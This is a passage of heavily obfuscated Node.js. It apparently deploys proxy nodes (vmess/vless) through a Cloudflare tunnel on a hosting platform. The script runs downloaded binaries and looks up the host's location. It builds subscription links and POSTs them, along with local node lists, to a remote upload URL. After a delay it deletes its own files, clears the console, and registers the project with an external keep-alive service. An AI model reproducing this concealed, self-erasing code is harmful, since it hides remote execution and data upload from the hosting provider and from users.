exec(_0x30da10(0x21f)+botName+_0x30da10(0x264)):await exec(_0x30da10(0x268)+botName['charAt'](0x0)+']'+botName[_0x30da10(0x24c)](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x2de380){}}_0xa2d5b4(),await new Promise(_0x47acd7=>setTimeout(_0x47acd7,0xbb8));const _0x465496='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x56b05e(0x261)+ARGO_PORT;try{await exec(_0x56b05e(0x1f3)+botPath+'\x20'+_0x465496+_0x56b05e(0x1e3)),console[_0x56b05e(0x1f8)](botName+_0x56b05e(0x1b6)),await new Promise(_0x121c42=>setTimeout(_0x121c42,0xbb8)),await extractDomains();}catch(_0x19c624){console[_0x56b05e(0x1dd)](_0x56b05e(0x272)+_0x19c624);}}}catch(_0x131efa){console[_0x56b05e(0x1dd)](_0x56b05e(0x21d),_0x131efa);}async function _0x3ba685(){const _0x3506a2=_0x56b05e;try{const _0x4c8044={};_0x4c8044['timeout']=0xbb8;const _0x54ee69=await axios[_0x3506a2(0x1ce)]('https://ipapi.co/json/',_0x4c8044);if(_0x54ee69[_0x3506a2(0x204)]&&_0x54ee69[_0x3506a2(0x204)]['country_code']&&_0x54ee69[_0x3506a2(0x204)][_0x3506a2(0x1bf)])return _0x54ee69[_0x3506a2(0x204)]['country_code']+'_'+_0x54ee69[_0x3506a2(0x204)]['org'];}catch(_0x28288a){try{const _0x5f4377={};_0x5f4377[_0x3506a2(0x205)]=0xbb8;const _0x1979bc=await axios[_0x3506a2(0x1ce)]('http://ip-api.com/json/',_0x5f4377);if(_0x1979bc[_0x3506a2(0x204)]&&_0x1979bc['data'][_0x3506a2(0x1ea)]===_0x3506a2(0x1fa)&&_0x1979bc[_0x3506a2(0x204)][_0x3506a2(0x22a)]&&_0x1979bc[_0x3506a2(0x204)][_0x3506a2(0x1bf)])return _0x1979bc[_0x3506a2(0x204)][_0x3506a2(0x22a)]+'_'+_0x1979bc[_0x3506a2(0x204)][_0x3506a2(0x1bf)];}catch(_0x268f93){}}return _0x3506a2(0x1ee);}async function _0xab589b(_0x5a2d33){const _0x32d40a=await _0x3ba685(),_0x44c76b=NAME?NAME+'-'+_0x32d40a:_0x32d40a;return new Promise(_0xb1b8=>{setTimeout(()=>{const _0x313245=_0x3326,_0x1a1163={};_0x1a1163['v']='2',_0x1a1163['ps']=''+_0x44c76b,_0x1a1163[_0x313245(0x218)]=CFIP,_0x1a1163[_0x313245(0x1b9)]=CFPORT,_0x1a1163['id']=UUID,_0x1a1163['aid']='0',_0x1a1163['scy']=_0x313245(0x267),_0x1a1163[_0x313245(0x28a)]='ws',_0x1a1163[_0x313245(0x21e)]=_0x313245(0x267),_0x1a1163[_0x313245(0x299)]=_0x5a2d33,_0x1a1163[_0x313245(0x1b5)]=_0x313245(0x1ad),_0x1a1163[_0x313245(0x250)]='tls',_0x1a1163['sni']=_0x5a2d33,_0x1a1163['alpn']='',_0x1a1163['fp']=_0x313245(0x23c);const _0x1d6fc7=_0x1a1163,_0x2e5982=_0x313245(0x244)+UUID+'@'+CFIP+':'+CFPORT+_0x313245(0x1d4)+_0x5a2d33+_0x313245(0x279)+_0x5a2d33+_0x313245(0x269)+_0x44c76b+_0x313245(0x25b)+Buffer['from'](JSON[_0x313245(0x28e)](_0x1d6fc7))[_0x313245(0x295)](_0x313245(0x1c8))+_0x313245(0x257)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x5a2d33+'&fp=firefox&type=ws&host='+_0x5a2d33+_0x313245(0x265)+_0x44c76b+_0x313245(0x203);console[_0x313245(0x1f8)](Buffer['from'](_0x2e5982)['toString']('base64')),fs[_0x313245(0x1f4)](subPath,Buffer[_0x313245(0x285)](_0x2e5982)[_0x313245(0x295)]('base64')),console['log'](FILE_PATH+_0x313245(0x25d)),uploadNodes(),app[_0x313245(0x1ce)]('/'+SUB_PATH,(_0x4de8b1,_0x46dbba)=>{const _0x16bfda=_0x313245,_0x54b4c3=Buffer['from'](_0x2e5982)[_0x16bfda(0x295)](_0x16bfda(0x1c8));_0x46dbba[_0x16bfda(0x1d0)](_0x16bfda(0x27b),_0x16bfda(0x28f)),_0x46dbba['send'](_0x54b4c3);}),_0xb1b8(_0x2e5982);},0x7d0);});}}async function uploadNodes(){const _0x3d6aad=_0x4d48b6;if(UPLOAD_URL&&PROJECT_URL){const _0x3e377b=PROJECT_URL+'/'+SUB_PATH,_0x5ebcce={};_0x5ebcce[_0x3d6aad(0x23e)]=[_0x3e377b];const _0x283e5d=_0x5ebcce;try{const _0x30010a={};_0x30010a[_0x3d6aad(0x27b)]='application/json';const _0x307aed={};_0x307aed[_0x3d6aad(0x1f9)]=_0x30010a;const _0x4ccea5=await axios[_0x3d6aad(0x24e)](UPLOAD_URL+_0x3d6aad(0x24b),_0x283e5d,_0x307aed);return _0x4ccea5&&_0x4ccea5['status']===0xc8?(console[_0x3d6aad(0x1f8)]('Subscription\x20uploaded\x20successfully'),_0x4ccea5):null;}catch(_0x14dadc){if(_0x14dadc['response']){if(_0x14dadc[_0x3d6aad(0x1c0)][_0x3d6aad(0x1ea)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3d6aad(0x20a)](listPath))return;const _0x47ea16=fs[_0x3d6aad(0x23b)](listPath,'utf-8'),_0x1c028d=_0x47ea16[_0x3d6aad(0x288)]('\x0a')['filter'](_0x30048c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3d6aad(0x252)](_0x30048c));if(_0x1c028d[_0x3d6aad(0x2a4)]===0x0)return;const _0xd82551={};_0xd82551[_0x3d6aad(0x1d1)]=_0x1c028d;const _0x722cf3=JSON[_0x3d6aad(0x28e)](_0xd82551);try{const _0x38df6d={};_0x38df6d[_0x3d6aad(0x27b)]=_0x3d6aad(0x2a2);const _0xfd72a2={};_0xfd72a2['headers']=_0x38df6d;const _0x11ed22=await axios[_0x3d6aad(0x24e)](UPLOAD_URL+'/api/add-nodes',_0x722cf3,_0xfd72a2);return _0x11ed22&&_0x11ed22[_0x3d6aad(0x1ea)]===0xc8?(console[_0x3d6aad(0x1f8)](_0x3d6aad(0x238)),_0x11ed22):null;}catch(_0x187d96){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x11499e=_0x3326,_0xee0213=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xee0213['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xee0213['push'](phpPath);process[_0x11499e(0x1e2)]===_0x11499e(0x232)?exec(_0x11499e(0x207)+_0xee0213['join']('\x20')+_0x11499e(0x1b8),_0xd34b4a=>{const _0x3be180=_0x11499e;console['clear'](),console[_0x3be180(0x1f8)]('App\x20is\x20running'),console[_0x3be180(0x1f8)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x11499e(0x286)+_0xee0213[_0x11499e(0x27e)]('\x20')+_0x11499e(0x1fe),_0x3cda75=>{const _0x2c74d5=_0x11499e;console[_0x2c74d5(0x1d3)](),console[_0x2c74d5(0x1f8)]('App\x20is\x20running'),console['log'](_0x2c74d5(0x1fc));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x31f1b4=_0x4d48b6;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x31f1b4(0x1f8)](_0x31f1b4(0x275));return;}try{const _0x5efdf1={};_0x5efdf1['url']=PROJECT_URL;const _0x585615={};_0x585615['Content-Type']='application/json';const _0x3d1704={};_0x3d1704[_0x31f1b4(0x1f9)]=_0x585615;const _0x30d950=await axios[_0x31f1b4(0x24e)](_0x31f1b4(0x2a3),_0x5efdf1,_0x3d1704);return console[_0x31f1b4(0x1f8)](_0x31f1b4(0x1e1)),_0x30d950;}catch(_0x4c6f53){return console[_0x31f1b4(0x1dd)](_0x31f1b4(0x25c)+_0x4c6f53[_0x31f1b4(0x1d9)]),null;}}async function startserver(){const _0x194394=_0x4d48b6;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2327de){console[_0x194394(0x1dd)](_0x194394(0x1af),_0x2327de);}}startserver()[_0x4d48b6(0x222)](_0x1e3829=>{const _0x4847a6=_0x4d48b6;console['error'](_0x4847a6(0x1ef),_0x1e3829);}),app[_0x4d48b6(0x1cd)](PORT,()=>console[_0x4d48b6(0x1f8)](_0x4d48b6(0x1de)+PORT+'!'));
